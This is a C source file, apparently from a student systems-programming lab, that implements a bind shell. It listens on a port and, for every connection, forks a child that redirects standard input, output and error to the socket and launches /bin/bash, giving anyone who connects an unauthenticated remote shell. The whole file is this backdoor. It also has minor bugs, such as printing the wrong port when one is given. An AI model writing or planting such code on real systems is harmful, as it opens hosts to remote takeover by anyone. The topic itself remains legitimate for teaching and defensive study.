#include "header.h"
#include "utils_v2.h"
#define BUF_SZ 50

/**
 * Child processus which execute the command bash received through the given
 * socket.
 *
 * PRE: sockfd: a valid socket file descriptor.
 * POST: execute the command bash.
 */
void childExec(void *sockfd);

/**
 * PRE:  port: a valid port number
 * POST: on success, binds a socket to 0.0.0.0:serverPort and listens to it ;
 *       on failure, displays error cause and quits the program
 * RES:  return socket file descriptor
 */
int initSocketServer(int port);

int main(int argc, char **argv) {
  int sockfd, newsockfd, port, ret;
  int randomInt = randomIntBetween(0, 9);
  char msg[SIZE_MESSAGE];
  pid_t bufferPid[BUF_SZ];
  


  if (argc > 1) {
    port = atoi(argv[1]);
    sockfd = initSocketServer(port);
  } else {
    sockfd = initSocketServer(TAB_PORTS[randomInt]);
  }
  printf("The server listens on the port : %d \n", TAB_PORTS[randomInt]);
  pid_t childPID;
  
  while (1) {
    // newsockfd = accept(sockfd, NULL, NULL);
    newsockfd = saccept(sockfd); // quand labo mettre accept!!
    // si accept retourne -1 alors il faut tuer programme inoffensif
    // propager SIGINT
    if (newsockfd > 0) {
      childPID = fork_and_run1(childExec, &newsockfd);
    }
  }
  sclose(sockfd);
  return 0;
}

// child process run the command
void childExec(void *sockfd) {
  int newsockfd = *(int *)sockfd;

  // redirection STDIN, STDERR, STDOUT 
  dup2(newsockfd, STDIN_FILENO);
  dup2(newsockfd, STDOUT_FILENO);
  dup2(newsockfd, STDERR_FILENO);

  sexecl("/bin/bash", NOM_PROG, NULL);
}

// establish a passive sock connection
int initSocketServer(int port) {
  int sockfd = ssocket();
  int option = 1;
  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(int));
  sbind(port, sockfd);
  slisten(sockfd, BACKLOG);
  return sockfd;
}
